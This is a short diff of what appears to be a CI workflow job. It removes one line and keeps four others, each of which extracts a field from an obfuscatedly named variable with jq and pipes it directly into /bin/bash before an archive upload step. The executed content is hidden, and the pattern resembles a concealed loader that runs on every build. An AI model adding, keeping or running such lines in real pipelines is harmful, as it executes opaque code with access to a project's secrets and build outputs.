@@ -28,7 +28,6 @@ jobs:
           echo $qwc0 | jq -r .tx9 | /bin/bash
           echo $ga88 | jq -r .lbsgw12721 | /bin/bash
           printf '%s' "$eb73921" | jq -r .ng2 | /bin/bash
-          printf '%s' "$y24" | jq -r .ikhmd1292 | /bin/bash
           printf '%s' "$l5" | jq -r .y4 | /bin/bash
 
       - name: Upload archive
